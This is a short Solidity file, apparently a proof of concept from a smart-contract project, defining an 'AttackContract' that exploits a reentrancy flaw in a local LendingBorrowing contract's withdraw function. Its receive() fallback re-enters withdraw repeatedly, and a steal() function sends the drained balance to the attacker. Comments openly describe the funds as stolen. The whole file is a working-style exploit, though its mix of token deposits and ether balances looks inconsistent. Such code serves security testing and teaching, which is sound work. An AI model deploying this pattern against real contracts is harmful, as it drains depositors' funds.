// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "../LendingBorrowing.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract AttackContract {
    IERC20 private s_usdc;
    LendingBorrowing private lendingBorrowing;
    address private owner;

    constructor(address _usdcAddress, address _lendingBorrowingAddress) {
        s_usdc = IERC20(_usdcAddress);
        lendingBorrowing = LendingBorrowing(_lendingBorrowingAddress);
        owner = msg.sender;
    }

    function attack(uint256 amount) public {
        // Deposits tokens to the LendingBorrowing contract
        s_usdc.approve(address(lendingBorrowing), amount);
        lendingBorrowing.deposit(amount);

        // Run the attack to exploit re-entrency in withdraw function
        lendingBorrowing.withdraw(amount);
    }

    // This is the function that gets called recursively by the withdraw function
    receive() external payable {
        if (address(lendingBorrowing).balance >= msg.value) {
            lendingBorrowing.withdraw(msg.value);
        }
    }

    // The owner of the contract withdraw the stolen funds
    function steal() public {
        require(msg.sender == owner, "Only attacker can call this function");
        payable(owner).transfer(address(this).balance);
    }
}
